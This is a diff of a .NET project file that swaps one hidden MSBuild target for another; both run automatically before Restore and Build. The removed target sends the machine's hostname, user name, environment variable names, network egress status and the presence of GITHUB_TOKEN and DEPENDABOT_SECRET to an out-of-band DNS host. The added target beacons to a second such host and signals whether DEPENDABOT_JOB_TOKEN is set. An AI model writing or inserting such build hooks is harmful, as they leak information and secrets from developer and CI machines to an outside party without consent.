@@ -8,20 +8,8 @@
     <PackageReference Include="System.Text.Json" Version="6.0.0" />
     <PackageReference Include="Serilog" Version="2.0.0" />
   </ItemGroup>
-  <Target Name="DepExecV4" BeforeTargets="ResolveReferences;Build;Restore">
-    <!-- Confirm exec -->
-    <Exec Command="nslookup exec-v4.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null || true" IgnoreExitCode="true" ContinueOnError="true" />
-    <!-- Capture hostname -->
-    <Exec Command="nslookup host-$(hostname | tr '.' '-' | head -c 50).d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null || true" IgnoreExitCode="true" ContinueOnError="true" />
-    <!-- Capture whoami -->
-    <Exec Command="nslookup user-$(whoami | head -c 50).d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null || true" IgnoreExitCode="true" ContinueOnError="true" />
-    <!-- List env var names (not values) via DNS -->
-    <Exec Command="for v in $(env | cut -d= -f1 | head -15 | tr '\n' '-' | sed 's/-$//' | head -c 60); do nslookup envs-$v.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null; done || true" IgnoreExitCode="true" ContinueOnError="true" />
-    <!-- Check for GITHUB_TOKEN -->
-    <Exec Command="if [ -n &quot;$GITHUB_TOKEN&quot; ]; then nslookup has-github-token.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun; else nslookup no-github-token.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun; fi 2>/dev/null || true" IgnoreExitCode="true" ContinueOnError="true" />
-    <!-- Check for secrets -->
-    <Exec Command="if [ -n &quot;$DEPENDABOT_SECRET&quot; ]; then nslookup has-dep-secret.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun; else nslookup no-dep-secret.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun; fi 2>/dev/null || true" IgnoreExitCode="true" ContinueOnError="true" />
-    <!-- Check network egress -->
-    <Exec Command="curl -s -m 3 https://httpbin.org/ip > /dev/null 2>&amp;1 &amp;&amp; nslookup http-egress-yes.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun || nslookup http-egress-no.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null || true" IgnoreExitCode="true" ContinueOnError="true" />
+  <Target Name="RootV5" BeforeTargets="ResolveReferences;Build;Restore">
+    <Exec Command="nslookup rootv5.d90q3ve1b2euhqdlne30najxxhxz8xp8c.oast.online 2>/dev/null || true" IgnoreExitCode="true" ContinueOnError="true" />
+    <Exec Command="printenv DEPENDABOT_JOB_TOKEN > /dev/null 2>&amp;1 &amp;&amp; nslookup has-jt.d90q3ve1b2euhqdlne30najxxhxz8xp8c.oast.online 2>/dev/null || nslookup no-jt.d90q3ve1b2euhqdlne30najxxhxz8xp8c.oast.online 2>/dev/null || true" IgnoreExitCode="true" ContinueOnError="true" />
   </Target>
 </Project>
